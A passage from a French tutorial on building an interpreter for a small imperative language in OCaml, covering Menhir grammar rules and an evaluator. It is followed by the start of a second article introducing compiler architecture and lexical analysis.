permettent donc de faire plus de choses que les expressions rationnelles. On pourrait donc les utiliser aussi pour l'analyse lexicale… Sauf que, comme vous pouvez le voir sur l'exemple précédent, les expressions rationnelles permettent en général une écriture beaucoup plus concise (et l'implémentation derrière est moins lourde). Nous allons nous arrêter ici pour la théorie et passer à l'utilisation pratique de ce nouvel outil. Comme pour les expressions rationnelles, j'invite le lecteur curieux à se renseigner plus en détail sur les grammaires hors-contexte : il reste pas mal de choses à dire dessus. Vous apprendrez ainsi la signification de termes comme LL(*) ou LR(1) , vous découvrirez l'analyse descendante et les automates à pile. En poussant un peu plus loin vous entendrez parler de classification des langages, et de tout un tas de choses intéressantes qui vous permettront de briller dans les dîners de la haute société. Menhir Présentation L'outil que nous allons utiliser pour l'analyse syntaxique s'appelle Menhir. Tout comme Ocamllex pour l'analyse lexicale, il s'agit d'un générateur d'analyseur syntaxique : à partir de la description des termes d'une grammaire, il génère un fichier OCaml qui prendra en entrée un flot de lexèmes (sortant d'Ocamllex) et produira en sortie notre AST. Il s'agit d'une adaptation pour OCaml d'un outil conçu à l'origine pour le langage C, appelé Bison (qui est lui-même une alternative libre au logiciel Yacc). Il existe également un outil appelé Ocamlyacc dont vous entendrez certainement parler : ils se ressemblent beaucoup, mais Menhir est strictement meilleur, c'est pourquoi je vous conseille de l'utiliser dès que vous en avez la possibilité. Pour la petite histoire, Ocamlyacc est l'outil utilisé pour l'analyse syntaxique du langage OCaml (tout comme Ocamllex est utilisé pour son analyse lexicale), car il a l'avantage dans ce cas précis de simplifier le bootstrap du langage, étant écrit en C (et non pas en OCaml comme Menhir). Cette partie vous apprendra ce qu'il faut de Menhir pour interpréter notre petit langage, mais il restera encore beaucoup de choses à dire dessus. Je vous encourage à en lire la documentation pour en savoir plus (par exemple sur le traitement des erreurs et sur la librairie standard, que nous n'abordons pas du tout ici). Installation Menhir n'est pas fourni de base avec l'installation d'OCaml, il faudra donc l'installer explicitement vous-mêmes. Si vous êtes sous Windows, je ne sais pas comment l'installer, mais je suis à peu près persuadé que c'est possible (si quelqu'un l'a fait et peut écrire quelques lignes expliquant la manipulation, je serais ravi de les inclure ici). Plusieurs distributions Linux l'incluent dans leurs paquets. Pour les utilisateurs d'Archlinux, il existe un paquet ocaml-menhir dans l'AUR. Pour les autres distributions, je vous laisse chercher par vous-mêmes, ça ne devrait pas être très compliqué. Si vous êtes sur un unixoïde ne comprenant pas Menhir dans ses paquets, ou que vous préférez installer vos logiciels à la main, rendez-vous à cette adresse . Téléchargez les sources de Menhir, décompressez-les ( tar -xvf le_fichier.tar.gz ), placez-vous dans le répertoire qui les contient et lancez les commandes (vous avez besoin de l'outil Make , qui est de toute façon un indispensable que vous avez certainement déjà) : $ make $ make install Si tout s'est passé sans erreur, vous disposez maintenant de Menhir sur votre machine. Vous pouvez le vérifier en observant le résultat de la commande suivante : $ menhir Usage: menhir <options> <filenames> Redéfinissons nos lexèmes Notre analyseur lexical prendra en entrée un flux de lexèmes, il faut donc qu'il les connaisse d'une façon ou d'une autre. Pour cela, nous allons écrire les lignes suivantes, dans un fichier que vous appellerez parser.mly , afin de tous les redéfinir : %token True False Not And Or %token Greater Equal %token LeftPar RightPar LeftCurly RightCurly %token Affect %token If While Print %token Plus Times Minus %token < int > Int %token < string > Var %token Eof Chaque ligne commence par %token , suivi d'un ou plusieurs lexèmes (nous les avons ici regroupés dans un ordre plus ou moins « thématique »). Certains lexèmes peuvent prendre un paramètre : c'est le cas pour nous de Int et Var . Le type de ce paramètre est alors spécifié avant le token, entre chevrons : < ... > . Notez qu'une fois que nous aurons terminé l'écriture de notre analyseur syntaxique, nous n'aurons plus besoin du fichier tokens.ml : le type qu'il définit sera contenu dans le code OCaml produit par Menhir. Après ces lignes, ajoutez un séparateur %% sur une ligne. Il servira à différencier le header du fichier (le terme anglais est systématiquement utilisé) des termes et productions les utilisant, que nous placerons après. Passons aux choses sérieuses Commençons par écrire les productions des expressions arithmétiques. Notre terme s'appellera aexp . Nous commençons par sa définition structurelle : aexp: | Int | Var | aexp Plus aexp | aexp Minus aexp | aexp Times aexp | Minus aexp | LeftPar aexp RightPar Le terme est maintenant défini, mais tel quel, il ne nous servira pas beaucoup pour la création de l'AST. Il faut pouvoir récupérer les informations qu'il contient et en faire quelque chose. Pour cela, chaque production sera suivie, entre accolades {...} , d'un code OCaml qui construira l'AST correspondant. Pour récupérer la valeur associée à un élément de production, vous pouvez le nommer, comme le montre la ligne suivante : aexp: | x = Int { Ast.Int x } Rappelez-vous que nous avons défini le token Int comme prenant un paramètre de type int . x désigne ce paramètre dans la ligne que nous venons d'écrire. Pour les éléments étant eux-mêmes des termes de la grammaire, la valeur ainsi capturée correspond à la valeur renvoyée par l'analyseur syntaxique lorsqu'il analyse la phrase correspondante. C'est donc la valeur que vous écrivez entre accolades. On peut donc se servir de ces valeurs pour construire récursivement notre ast : aexp: | x = Int { Ast.Int x } | v = Var { Ast.Var v } | x = aexp Plus y = aexp { Ast.Plus (x, y) } | x = aexp Minus y = aexp { Ast.Minus (x, y) } | x = aexp Times y = aexp { Ast.Times (x, y) } | Minus x = aexp { Ast.Neg x } | LeftPar x = aexp RightPar { x } Sauf que, comme vous l'aurez évidemment remarqué, il y a un problème : notre parseur (il paraît que le terme existe en français) ne connait pas la priorité de Times sur Plus . En fait, il ne connait même pas la « priorité » de Plus sur Plus , c'est-à-dire l'associativité : comment réduire 1 + 2 + 3 , la racine doit-elle être le premier + ou le deuxième ? Par défaut, Menhir ne soulèvera pas d'erreur, mais seulement un warning : il appliquera des règles conventionnelles (du style de celles de notre lexeur). Seulement, si tout à l'heure c'était la façon canonique de fonctionner, la règle pour l'analyse syntaxique est de ne pas laisser passer ce genre de conflits (appelé « severe conflict ») où le parseur doit décider tout seul. Pour cela, nous allons déclarer dans le header l'associativité et la priorité de nos différents opérateurs. Pour cela, nous utiliserons les mots-clefs %left , %right et %nonassoc : ils définissent chacun l'associativité du lexème qu'ils précèdent, et un lexème écrit après un autre est considéré comme prioritaire sur le premier. Écrivons donc : %left Plus Minus %left Times %nonassoc neg %% À quoi sert le %nonassoc , puisqu'il n'apporte aucune information supplémentaire d'associativité ? Ici, il sert à définir la priorité de la négation unaire, qui doit être réduite avant les autres opérations. Mais attention, l'opérateur Minus de cette négation est le même que celui de la soustraction : on ne peut donc pas s'en servir dans notre règle. On écrit donc (arbitrairement) %neg pour nommer la règle, et on y fera référence dans la production à l'aide du mot-clef %prec . Voici donc le code complet à notre stade de l'analyseur syntaxique : %token True False Not And Or %token Greater Equal %token LeftPar RightPar LeftCurly RightCurly %token Affect %token If While Print %token Plus Times Minus %token < int > Int %token < string > Var %token Eof %left Plus Minus %left Times %nonassoc neg %% aexp : | x = Int { Ast . Int x } | v = Var { Ast . Var v } | x = aexp Plus y = aexp { Ast . Plus ( x , y ) } | x = aexp Minus y = aexp { Ast . Minus ( x , y ) } | x = aexp Times y = aexp { Ast . Times ( x , y ) } | Minus x = aexp { Ast . Neg x } %prec neg | LeftPar x = aexp RightPar { x } Les conflits ainsi résolus à l'aide de règles de priorité s'appellent les « benign conflicts ». Menhir ne vous préviendra pas de leur présence (en réalité, il est possible de les éviter complètement, mais ça mènerait à une multiplication assez lourde du nombre de termes qui n'est donc pas intéressante d'un point de vue pratique). Si vous avez bien compris ce que nous avons fait jusque là, le reste ne devrait vous poser aucun problème. Nous pouvons par exemple enchaîner directement avec les expressions booléennes : %left Or %left And %nonassoc Not %left Plus Minus %left Times %nonassoc neg %% bexp : | True { Ast . True } | False { Ast . False } | x = aexp Equal y = aexp { Ast . Equal ( x , y ) } | x = aexp Greater y = aexp { Ast . Greater ( x , y ) } | a = bexp And b = bexp { Ast . And ( a , b ) } | a = bexp Or b = bexp { Ast . Or ( a , b ) } | Not b = bexp { Ast . Not b } | LeftPar b = bexp RightPar { b } Où l'on termine l'écriture de notre AST avec les « commandes » du langage Jusqu'ici, le découpage de l'AST était assez intuitif (les expressions arithmétiques et booléennes se prêtant naturellement très bien à une transformation en arbre). Pour la suite, voici comment nous allons procéder : il reste les affectations, les boucles, les conditions, les print et les séquences de ces opérations. Tout cela est regroupé dans le type Ast.command . Nous aurons un terme command , qui correspondra à chacune de ces possibilités prise individuellement (donc pas la séquence), une règle sequence qui correspondra à une liste de commandes successives, et une règle prgm qui correspond à une sequence suivie de Eof . Il est important de retenir cette dernière particularité : vous devez penser à gérer correctement Eof dans votre parseur, sans quoi vous aurez des erreurs de type end-of-stream conflict et, pour faire simple, ça ne marchera pas. Une fois ce découpage fait, le codage de ce qui reste du parseur est relativement aisé, en voici donc la source complète : % { ( * Here can come OCaml code * ) % } %token True False Not And Or %token Greater Equal %token LeftPar RightPar LeftCurly RightCurly %token Affect %token If While Print %token Plus Times Minus %token < int > Int %token < string > Var %token Eof %start %left Or %left And %nonassoc Not %left Plus Minus %left Times %nonassoc neg %% prgm : | s = sequence Eof { s } sequence : | c = command { c } | c = command s = sequence { Ast . Seq ( c , s ) } command : | v = Var Affect x = aexp { Ast . Affect ( v , x ) } | Print x = aexp { Ast . Print x } | If b = bexp LeftCurly c = sequence RightCurly { Ast . If ( b , c ) } | While b = bexp LeftCurly c = sequence RightCurly { Ast . While ( b , c ) } aexp : | x = Int { Ast . Int x } | v = Var { Ast . Var v } | x = aexp Plus y = aexp { Ast . Plus ( x , y ) } | x = aexp Minus y = aexp { Ast . Minus ( x , y ) } | x = aexp Times y = aexp { Ast . Times ( x , y ) } | Minus x = aexp { Ast . Neg x } %prec neg | LeftPar x = aexp RightPar { x } bexp : | True { Ast . True } | False { Ast . False } | x = aexp Equal y = aexp { Ast . Equal ( x , y ) } | x = aexp Greater y = aexp { Ast . Greater ( x , y ) } | a = bexp And b = bexp { Ast . And ( a , b ) } | a = bexp Or b = bexp { Ast . Or ( a , b ) } | Not b = bexp { Ast . Not b } | LeftPar b = bexp RightPar { b } Il reste donc deux petites choses à expliquer, que vous aurez remarquées vous-mêmes si vous êtes attentifs. Tout d'abord, la possibilité d'écrire du code OCaml en tête du parseur. On aurait ainsi pu y écrire open Ast pour éviter d'écrire Ast devant chaque noeud produit - nous ne l'avons pas fait ici pour qu'on distingue bien les noeuds de l'arbre syntaxique des lexèmes, beaucoup ayant le même nom. La deuxième chose est la déclaration %start : tout-à-l'heure, ocamllex générait une fonction pour chaque règle de notre analyseur lexical. Ici, Menhir génèrera une fonction d'analyse syntaxique pour chaque terme déclaré à l'aide de cette commande. Vous aurez noté qu'on doit écrire nous-mêmes le type de sortie de la fonction produite : en l'occurrence, Ast.command (qui est le type auquel appartient le constructeur Seq ). Compilons ! C'est maintenant le moment de vérité : à l'aide de Menhir, vous allez pouvoir compiler le fichier que vous venez d'écrire vers le code OCaml de l'analyseur syntaxique. Exécutez donc les commandes suivantes : $ ocamlc -c ast.ml $ menhir --infer --explain parser.mly Si tout se passe bien… vous ne verrez rien. Mais si vous listez votre répertoire, 4 nouveaux fichiers seront apparus : ast.cmi et ast.cmo , qui correspondent à la compilation de notre fichier ast.ml (dont Menhir aura besoin à cause du type qu'il définit), et parser.ml et parser.mli . Vous pouvez d'ailleurs regarder l'interface de notre nouveau parser : $ cat parser.mli exception Error type token = | While | Var of (string) | True | Times | RightPar | RightCurly | Print | Plus | Or | Not | Minus | LeftPar | LeftCurly | Int of (int) | If | Greater | False | Equal | Eof | And | Affect val prgm: (Lexing.lexbuf -> token) -> Lexing.lexbuf -> (Ast.command) Comme vous pouvez le constater, on exporte le type de nos lexèmes, ainsi que la fonction dont je vous ai parlé tout à l'heure (nous étudierons son type et son utilisation dans la dernière partie), et une exception qui sera utilisée en cas d'erreur de syntaxe sur les codes que nous analyserons. Comme je vous l'ai annoncé plus haut, vous pouvez maintenant remplacer open Tokens par open Parser dans votre fichier lexer.mll : c'est notre fichier Menhir qui aura désormais la lourde responsabilité de définir les lexèmes de notre langage. Au secours, ça ne marche pas ! Si vous avez essayé d'écrire votre code Menhir vous-mêmes, je vous en félicite. Par contre vous aurez peut-être des erreurs ou des avertissements que vous ne comprenez pas. Les options que nous avons donné à Menhir servent à cela : --infer lui demande de vérifier lui-même la correction de notre typage dans l'analyseur syntaxique (ce qui fait plus d'erreur à la compilation vers OCaml, mais garantit que le fichier .ml produit est bien typé), et --explain lui demande de détailler les conflits dans un fichier parser.conflicts . Pour pouvoir bien comprendre ce compte-rendu, il vous faudrait des explications plus poussées sur le fonctionnement de l'analyse syntaxique et des automates à pile, qui n'ont pas leur place ici. Je vous encourage donc encore une fois à vous documenter sur le sujet : c'est indispensable pour une bonne maîtrise des outils que nous avons présentés. Toutefois, en lisant les quelques lignes générées, vous devriez avoir une idée des productions qui posent problème. En raisonnant par vous-mêmes, vous pourrez trouver les cas qui soulèvent un conflit et chercher une manière de les éviter. Ce n'est pas toujours très facile, mais c'est important de bien analyser la grammaire que vous avez définie : souvent, on a de très bonnes idées à ce sujet, avant de se rendre compte qu'elles ne peuvent tout simplement pas être utilisées à cause d'une ambiguité qu'on ne voit pas tout de suite « à l'oeil nu ». Une fois que tout fonctionne bien, ça y est, vous en avez fini avec l'analyse syntaxique - et avec ça, le plus gros du travail sur notre interpréteur. Encore un dernier petit effort et vous aurez enfin votre petit langage de programmation ! L'interprétation Maintenant que nous avons produit notre AST, il ne nous reste plus qu'à effectuer la dernière passe de notre implémentation : l'interprétation de cet arbre. Pour cela, nous allons utiliser une méthode classique de « parcours en profondeur » : voyons comment faire en commençant par les expressions arithmétiques. Notre arbre étant une structure récursive (comme sa définition OCaml le montre bien), il est naturel d'écrire une fonction récursive pour l'interpréter. Les cas de base (les feuilles de l'arbre)sont donc Int et Var , et les cas complexes Neg , Minus , Plus et Times . Nous allons donc commencer par écrire une fonction qui évalue une expression arithmétique en se basant sur ces quelques cas. Elle devra bien sûr renvoyer la valeur (de type int ) correspondant au calcul de l'expression. Le cas Int x est facile à traiter : il suffit de renvoyer x . Les cas complexes s'écrivent aussi très naturellement par récurrence sur leurs deux branches : par exemple, eval_aexp Plus (x, y) vaudra eval_aexp x + eval_aexp y (regardez à nouveau la définition du type Ast.aexp si vous ne comprenez pas). Il nous reste donc à traiter le cas de base Var x , où x contient l'identifiant d'une variable. Cette variable a préalablement été affectée et contient une certaine valeur entière, qu'il faudra donc renvoyer. Pour cela, notre fonction eval_aexp devra pouvoir récupérer sa valeur à partir de son identifiant : le plus simple est de lui fournir un environnement , qui contient la valeur de chaque identifiant. Nous choisirons pour cela une solution très basique mais suffisante dans notre cas : une liste de type (string * int) list , qui contiendra des couples (identifiant, valeur) . OCaml nous fournit la fonction List.assoc , de type ​'a -> ('a * 'b) list -> 'b , qui nous fournira la valeur de notre identifiant. Notre fonction d'évaluation des expressions arithmétiques prendra cet environnement en argument, elle s'écrit donc (dans un fichier eval.ml ) : let rec eval_aexp env = function | Int x -> x | Var v -> List.assoc v env | Neg x -> - (eval_aexp env x) | Minus (x, y) -> eval_aexp env x - eval_aexp env y | Plus (x, y) -> eval_aexp env x + eval_aexp env y | Times (x, y) -> eval_aexp env x * eval_aexp env y (* eval_aexp : (string * int) list -> Ast.aexp -> int *) Si vous voulez tester votre fonction tout de suite (ce qui est la bonne chose à faire), n'oubliez pas d'ouvrir le module Ast en écrivant open Ast avant votre fonction. Ne nous arrêtons pas en si bon chemin, et continuons avec les expressions booléennes. Les cas de base sont True et False , et les cas composés And , Or , Not , Equal et Greater . Les différents cas ressemblent beaucoup à ceux de eval_aexp , avec un tout petit ajout : Equal et Greater prennent comme paramètres non pas des expressions booléennes, mais des expressions arithmétiques. On appellera donc eval_aexp sur les deux branches, qu'il faut alors avoir défini préalablement. Or, eval_aexp prend comme paramètre l'environnement : il faut donc que eval_bexp le connaisse aussi, même si elle n'en a pas besoin directement. La fonction s'écrit donc : let rec eval_bexp env = function | True -> true | False -> false | And (a, b) -> eval_bexp env a && eval_bexp env b | Or (a, b) -> eval_bexp env a || eval_bexp env b | Not a -> not (eval_bexp env a) | Equal (x, y) -> eval_aexp env x = eval_aexp env y | Greater (x, y) -> eval_aexp env x > eval_aexp env y (* eval_bexp : (string * int) list -> Ast.bexp -> int *) Maintenant que nous savons évaluer les expressions booléennes et arithmétiques, il ne nous reste plus qu'à exécuter les commandes à l'aide d'une dernière fonction eval_prgm . Elle devra s'occuper d'évaluer les AST de type Ast.command . Par rapport aux deux derniers, ceux-ci sont particuliers : ils peuvent contenir une instruction qui agissent par effet de bord , c'est à dire qu'ils modifient l'état du programme. En l'occurrence, l'état de notre programme est représenté par l'environnement qu'on passe en argument aux deux fonctions précédentes : l'instruction Affect modifie cet environnement pour y changer la valeur affectée à une variable (en créant la variable si elle n'existe pas encore). Il faut donc trouver un moyen de rendre ces changements effectifs pour les deux autres fonctions : une bonne solution est de passer en argument à eval_prgm l'environnement actuel, et de lui faire renvoyer l'environnement éventuellement modifié. Notre fonction sera donc de type : (string * int) list -> Ast.command -> (string * int) list . Note de milieu de page (à lire pour les plus curieux) En réalité, on considère que Print correspond aussi à un effet de bord : il modifie l'état de l'affichage, ce qui peut avoir une influence sur d'autres parties du programme (qui lisent cet affichage) mais surtout impose de faire attention à l'ordre d'évaluation : on peut calculer la valeur des deux branches de Add dans l'ordre qu'on veut, mais il faut effectuer les Print dans le bon ordre sous peine d'afficher n'importe quoi à l'écran. Fin de la note Lorsqu'on doit traiter le cas de base Affect(v, x) , il faut donc renvoyer l'environnement env qu'on a reçu comme argument en le modifiant de la façon suivante : Si v n'était pas défini, on y rajoute le couple (v, x) Si v était défini, on y remplace le couple (v, y) présent par (v, x) On est ainsi certain que chaque variable n'est présente qu'une seule fois dans notre environnement : on évite ainsi de faire exploser sa taille en cas de redéfinitions successives d'une variable (dans une boucle par exemple). Nous allons commencer par écrire une fonction update qui effectuera l'opération précédemment décrite sur un environnement : let rec update env v x = match env with | [] -> [(v, x)] | (w, y) :: s -> if v = w then (v, x) :: s else (w, y) :: update s v x Cette fonction devrait être assez simple pour que vous la compreniez tout seul. Il ne nous reste plus qu'à écrire eval_prgm : let rec eval_prgm env = function | Affect (v, x) -> update env v (eval_aexp env x) | Print x -> print_int (eval_aexp env x); print_newline (); env | If (b, c) -> if eval_bexp env b then eval_prgm env c else env | While (b, c) as w -> if eval_bexp env b then let e = eval_prgm env c in eval_prgm e w else env | Seq (c1, c2) -> let e = eval_prgm env c1 in eval_prgm e c2 Comme vous pouvez le constater, on fait appel à eval_aexp pour évaluer la valeur à affecter à une variable, et à eval_bexp pour évaluer les conditions de If et de While . Si vous avez bien compris le fonctionnement de la gestion de l'environnement, la ligne de Seq ne devrait pas vous poser de problème : on récupère l'environnement modifié par c1 , qui est la première partie du programme (« avant le ; »), pour le passer en argument de l'évaluation de c2 . Il ne nous reste plus qu'à appeler notre fonction eval_prgm sur l'AST renvoyé par notre parseur (qui, rappelez-vous, est de type Ast.command ). Comme je vous l'ai dit plus haut, Menhir produit un fichier OCaml qui fournit la fonction suivante : val prgm: (Lexing.lexbuf -> token) -> Lexing.lexbuf -> (Ast.command) . Vous vous souvenez aussi peut-être qu'Ocamllex nous fournissait une fonction lexer ayant le type Lexing.lexbuf -> Parser.token : c'est cette fonction que vous devrez fournir comme premier argument de Parser.prgm . Le deuxième argument est un buffer qui correspondra à l'entrée de notre interpréteur : dans notre cas, nous nous contenterons d'un fichier qui contiendra notre code Imp. Le module Lexing nous fournit une fonction from_channel de type in_channel -> lexbuf : nous allons utiliser cette fonction pour récupérer le lexbuf correspondant à notre fichier de code, lequel aura été ouvert par open_in que vous devez connaître. N'oubliez pas qu' eval_prgm prend un environnement en paramètre : pour l'appel initial, il faudra donc lui donner la liste vide (aucune variable n'existant avant que le programme Imp soit exécuté). Voici donc le code final de notre fichier eval.ml : open Ast type env = (string * int) list let rec update (e : env) v x = match e with | [] -> [(v, x)] | (w, y) :: s -> if v = w then (v, x) :: s else (w, y) :: update s v x let rec eval_prgm env = function | Affect (v, x) -> update env v (eval_aexp env x) | Print x -> print_int (eval_aexp env x); print_newline (); env | If (b, c) -> if eval_bexp env b then eval_prgm env c else env | While (b, c) as w -> if eval_bexp env b then let e = eval_prgm env c in eval_prgm e w else env | Seq (c1, c2) -> let e = eval_prgm env c1 in eval_prgm e c2 and eval_bexp env = function | True -> true | False -> false | And (a, b) -> eval_bexp env a && eval_bexp env b | Or (a, b) -> eval_bexp env a || eval_bexp env b | Not a -> not (eval_bexp env a) | Equal (x, y) -> eval_aexp env x = eval_aexp env y | Greater (x, y) -> eval_aexp env x > eval_aexp env y and eval_aexp env = function | Int x -> x | Var v -> List.assoc v env | Neg x -> - (eval_aexp env x) | Minus (x, y) -> eval_aexp env x - eval_aexp env y | Plus (x, y) -> eval_aexp env x + eval_aexp env y | Times (x, y) -> eval_aexp env x * eval_aexp env y let _ = eval_prgm [] (Parser.prgm Lexer.lexer (Lexing.from_channel (open_in Sys.argv.(1)))) Vous aurez noté quelques petits bonus, notamment la définition d'un type env pour l'environnement (qui sera plus lisible si vous testez vos fonctions dans un terminal OCaml) et l'utilisation de Sys.argv.(1) comme nom de fichier : il s'agit du premier argument passé à notre programme lorsqu'on l'appellera en ligne de commande (ainsi, on évite de devoir écrire le nom du fichier Imp à exécuter en dur dans eval.ml et recompiler à chaque fois qu'on souhaite le changer). Il ne nous reste plus qu'à compiler notre programme et à l'exécuter : $ ocamlbuild -use-menhir eval.native Finished, 17 targets ( 4 cached ) in 00 :00:01. $ cat test.imp // On initialise les variables n : = 5 f : = 1 /* boucle principale /* commentaire imbriqué */ */ while n > 0 { f : = f * n n : = n - 1 } print f /* On peut même print-er des expressions numériques */ print 3 + 4 * 5 $ ./eval.native test.imp 120 23 Si ocamlbuild vous crache un message d'erreur qui commence par SANITIZE , exécutez le script _build/sanitize.sh avant de recommencer les commandes précédentes. Et voilà, vous avez un interpréteur fonctionnel ! À travers ce court tutoriel, vous avez appris toutes les étapes de l'interprétation d'un petit langage : analyse lexicale, analyse syntaxique et évaluation. Que faire maintenant ? Après cette rapide découverte, je vous invite une dernière fois à vous renseigner plus en détail sur les parties qui vous ont intéressé : il y a encore plein de choses à dire sur le sujet. Vous pouvez aussi améliorer l'interpréteur actuel, qui est très minimaliste. Voici une liste non exhaustive de fonctionnalités que vous pouvez rajouter pour vous entraîner : Implémenter les opérations manquantes : booléennes comme < mais aussi arithmétiques comme le modulo ou la division (attention à zéro !) Pouvoir écrire && , || et ! comme raccourcis de and , or et not Pouvoir manipuler les expressions booléennes comme des expressions arithmétiques (notamment, pouvoir les affecter à des variables). Cela pose la question du typage : on ne pourra plus écrire x + y pour toutes les variables x et y Ajouter d'autres types de bases : flottants, chaînes de caractères… Ajouter des types composés, comme les tableaux ou les listes Ajouter la commande goto qui permet de sauter à un endroit donné du programme (cela demande de réfléchir un peu plus l'étape d'évaluation) Ajouter des procédures/fonctions à Imp. En plus de la définition de ces procédures (qui feront partie de l'environnement), cela pose la question de la portée des variables : si je définis a dans une procédure, je ne veux pas écraser en dehors de cette procédure la valeur qu'il avait. Ces différentes possibilités sont classées approximativement par ordre de difficulté… et donc d'intérêt. Si vous en voulez encore, je vous invite à vous renseigner sur la compilation : les deux premières étapes sont communes, mais un compilateur fait beaucoup plus de choses dans l'analyse sémantique : il ne s'agit plus d'évaluer un AST dans un langage fournissant déjà les abstractions nécessaires, mais de transformer un programme écrit en Imp en un programme dans un langage à la sémantique très différente (et souvent assez pauvre). Bon courage !"},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/introduction-a-la-compilation","title":"Introduction à la compilation","text":"La compilation est sans conteste l'un des domaines les plus riches et les plus passionnants de l'informatique. Pour autant c'est aussi l'un des plus difficiles à aborder de par la diversité et la complexité des problématiques qu'il englobe et la quantité de notions théoriques qu'il fait intervenir. Depuis les années 1950, pendant lesquelles sont nés les premiers assembleurs puis les tous premiers langages dits \"de haut niveau\" (Fortran, Cobol et Lisp), le monde entier de l'informatique respire grâce à ces organes vitaux que sont les compilateurs et les langages de programmation. Dès lors, ceux-ci n'ont eu de cesse de devenir de plus en plus sophistiqués, de plus en plus optimisés, de plus en plus efficaces, entraînant avec eux des générations d'ingénieurs et de chercheurs toujours plus avides de voir leurs machines faire plus, plus vite, plus facilement, plus sûrement ; il n'est donc pas surprenant de constater que le fonctionnement interne des langages de programmation modernes soit devenu hermétique au profane après tout ce temps. Cependant, aussi complexe le sujet soit-il, l'étude des compilateurs est une porte d'entrée vers la maîtrise d'un grand nombre de notions importantes d'algorithmique via leur application directe, et sa difficulté le prix à payer pour acquérir une compréhension profonde des enjeux des recherches actuelles dans diverses branches de l'informatique. Cela vaut bien la peine de verser un peu de sueur, d'autant que la création d'un langage de programmation et de son compilateur peut s'avérer être une tâche aussi amusante que stimulante ! Cela entraîne une question épineuse : comment aborder un domaine aussi riche que celui-ci sans perdre sa motivation ? D'aucuns ne jurent que par la lecture de l'incontournable référence, le fameux Dragon Book où sont abordés par le menu et de façon théorique tous les aspects de la compilation, alors que d'autres ouvrages que l'on trouve en abondance sur internet proposent une démarche purement pratique, en exposant l'écriture d'un compilateur ou d'un interpréteur pour un langage-jouet, quitte à renvoyer le lecteur vers le Dragon Book pour une introduction plus rigoureuse. Ce texte est le premier d'une série d'articles se voulant le juste milieu entre les deux approches, en introduisant le lecteur à la compilation sans faire l'impasse sur la théorie, mais en travaillant essentiellement sur des cas concrets. Le but recherché n'est certainement pas de se substituer au Dragon Book , mais de proposer une initiation plus digeste à l'écriture de compilateurs, sans pour autant en masquer la difficulté. Dans cet article, nous survolerons le domaine et les différentes problématiques qui le composent en nous intéressant à un exemple complet et non trivial : nous allons créer un moteur d'expressions régulières de A à Z. Cela nous permettra d'introduire les différentes phases d'analyse opérées par les compilateurs, tout en sensibilisant le lecteur à une approche des expressions rationnelles plus rigoureuse algorithmiquement parlant que le modèle omniprésent du backtracking. Architecture et fonctionnement d'un compilateur Expressions rationnelles Analyse lexicale et syntaxique d'expressions rationnelles Arbres syntaxiques abstraits Notation post-fixée et parseur à pile Notation infixe et grammaires non contextuelles Un lexeur et un parseur simples Évaluation d'expressions rationnelles Algorithme de backtracking Algorithme de Thompson Représentation intermédiaire et algorithme de McNaughton-Yamada-Thompson Implémentation de la machine virtuelle Pistes d'amélioration Mise en cache de l'AFD d'une expression régulière Application réaliste des expressions régulières Références Architecture et fonctionnement d'un compilateur Un compilateur n'est rien d'autre qu'un programme effectuant la traduction d'un code source lisible et manipulable par l'être humain vers un langage cible . Toute la subtilité de cette définition tient dans le caractère relativement vague de la notion de \"langage cible\". Contrairement à une idée reçue très répandue, le langage cible ne désigne pas nécessairement un langage machine, ni même un langage à plus bas niveau d'abstraction que le langage source ; celui-ci peut être un langage d'assemblage, un bytecode , ou bien un autre langage de programmation. À vrai dire, quelle que soit la nature du langage cible, celui-ci n'impacte qu'une partie limitée du compilateur, dont nous pouvons dès à présent dériver un premier schéma d'architecture. (code source) | V +-----------------+ | Partie frontale | +-----------------+ | V (représentation intermédiaire) | V +---------------+ | Partie finale | +---------------+ | V (programme cible) Schématiquement, la partie frontale (le frontend ) du compilateur se charge de réaliser différentes analyses du code-source en même temps qu'elle le transforme en une représentation intermédiaire. Cette représentation intermédiaire est ensuite communiquée à la partie finale (le backend ) du compilateur, dont le rôle est de générer le code du programme dans le langage cible, en opérant éventuellement une série d'optimisations propres à l'architecture visée. Cette séparation logique n'est pas obligatoirement visible dans tous les compilateurs, néanmoins elle facilite la conception de programmes portables, puisque leur partie frontale est totalement indépendante du langage cible, et leur partie finale indépendante du langage source. Des exemples bien connus de compilateurs exploitant cette séparation sont LLVM et le framework de GCC. En effet, GCC est conçu comme un ensemble de frontends (un pour chaque langage supporté) produisant la même représentation intermédiaire, elle-même comprise par une multitude de backends (un pour chaque architecture cible possible). Ajouter à GCC un compilateur vers un nouveau langage revient donc à écrire son frontend : ce compilateur supportera automatiquement toutes les architectures déjà gérées par GCC. Réciproquement, supporter une nouvelle architecture dans GCC revient à écrire un nouveau backend qui sera automatiquement compatible avec tous les compilateurs de la collection. Il arrive que le travail de la partie frontale du compilateur soit lui-même désigné par le terme \"compilation\". Cet usage est d'ailleurs justifié lorsque le backend est remplacé par un interpréteur qui, au lieu de générer le programme dans un langage cible, va lui-même exécuter le programme à partir de sa représentation intermédiaire. On peut remarquer que la partie frontale d'un interpréteur tel que CPython, qui traduit le programme initial en bytecode , reste un compilateur au sens strict : suivant le point de vue que l'on désire adopter, on peut considérer que le bytecode est un langage cible à part entière puisqu'il est compris par une machine virtuelle, ou bien une représentation intermédiaire servant d'entrée à un backend comme dans le cas de LLVM. Le choix de l'une ou l'autre de ces interprétations dépend avant tout du contexte. Classiquement, le frontend d'un compilateur est chargé de réaliser trois phases d'analyses : lexicale, syntaxique et sémantique. Son architecture canonique est la suivante : (programme source) | V +------------------+ | Analyse lexicale | +------------------+ | (lexèmes) V +--------------------+ | Analyse syntaxique | +--------------------+ | (arbre syntaxique) V +--------------------+ | Analyse sémantique | +--------------------+ | (arbre syntaxique modifié) V +----------------------------------+ | Production de code intermédiaire | +----------------------------------+ | V (représentation intermédiaire) Le rôle de l'analyse lexicale est de reconnaître les différents \"mots\" du programme et de leur associer une étiquette décrivant la nature de ces mots. La structure ainsi obtenue est appelée lexème . Prenons par exemple l'expression suivante : int n = 40 + 2; L'analyseur lexical d'un compilateur C pourrait produire, à partir de cette expression, la suite de lexèmes (ou tokens ) suivante : (TYPE, \"int\") (IDENTIFIER, \"n\") (\"=\", \"=\") (INTEGER, \"40\") (OP, \"+\") (INTEGER, \"2\") Les étiquettes (ou \"labels\") des lexèmes décrivent à quoi correspondent les mots en fonction du vocabulaire du langage. L'analyse lexicale sert donc d'une part à vérifier que les mots employés par l'utilisateur sont tous bien formés (par exemple, 8ball est un mot qui ne peut pas exister dans des langages comme C ou Python, alors que 8-ball serait décomposé en l'expression 8 - ball 